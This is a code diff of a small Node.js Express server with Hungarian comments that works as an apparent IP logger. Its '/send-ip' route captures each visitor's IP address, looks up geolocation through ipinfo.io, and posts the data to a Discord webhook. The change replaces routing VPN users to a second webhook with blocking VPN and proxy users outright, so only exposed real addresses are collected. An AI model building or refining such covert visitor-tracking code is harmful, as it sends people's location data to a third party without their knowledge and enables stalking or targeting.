@@ -8,11 +8,11 @@ const port = process.env.PORT || 3000;
 // Statikus fájlok kiszolgálása (CSS, JS, stb.)
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Webhook URL-ek és API kulcsok a .env fájlból
+// Webhook URL és IPINFO token a .env fájlból
 const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
 const altWebhookUrl = process.env.DISCORD_ALT_WEBHOOK_URL;
 const ipinfoToken = process.env.IPINFO_TOKEN;
-const proxycheckApiKey = process.env.PROXYCHECK_API_KEY;
+const proxyCheckApiKey = process.env.PROXYCHECK_API_KEY; // ProxyCheck API kulcs
 
 // Az alapértelmezett útvonal (/) kiszolgálja az index.html-t
 app.get('/', (req, res) => {
@@ -29,14 +29,16 @@ app.get('/send-ip', async (req, res) => {
     const userIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
 
     try {
-        // Ellenőrizzük, hogy VPN-t használ-e az IP
-        const proxycheckResponse = await axios.get(`https://proxycheck.io/v2/${userIp}?key=${proxycheckApiKey}`);
-        const proxycheckData = proxycheckResponse.data;
+        // ProxyCheck API használata a VPN/Proxy ellenőrzéshez
+        const proxyCheckResponse = await axios.get(`https://proxycheck.io/v2/${userIp}?key=${proxyCheckApiKey}&vpn=1&proxy=1`);
+        const proxyCheckData = proxyCheckResponse.data;
 
-        // Ha VPN-t észlelünk, használjuk az alternatív webhook URL-t
-        const webhookToUse = proxycheckData.status === 'fail' ? altWebhookUrl : webhookUrl;
+        // Ha VPN vagy Proxy van, blokkoljuk a hozzáférést
+        if (proxyCheckData[userIp].vpn === "yes" || proxyCheckData[userIp].proxy === "yes") {
+            return res.status(403).send("Hozzáférés tilos: VPN vagy Proxy használata nem engedélyezett.");
+        }
 
-        // IP geolokáció lekérése ipinfo.io segítségével
+        // Ha nincs VPN vagy Proxy, akkor folytatódik az IP információk lekérése
         const geoResponse = await axios.get(`https://ipinfo.io/${userIp}?token=${ipinfoToken}`);
         const geoData = geoResponse.data;
 
@@ -53,9 +55,8 @@ app.get('/send-ip', async (req, res) => {
             }]
         };
 
-        // Webhook üzenet küldése a megfelelő URL-re (alapértelmezett vagy alternatív)
-        await axios.post(webhookToUse, message);
-
+        // Webhook küldése
+        await axios.post(webhookUrl, message);
         res.json({ ip: userIp }); // Visszaadja az IP-t JSON formátumban
     } catch (error) {
         console.error('Hiba:', error.message);
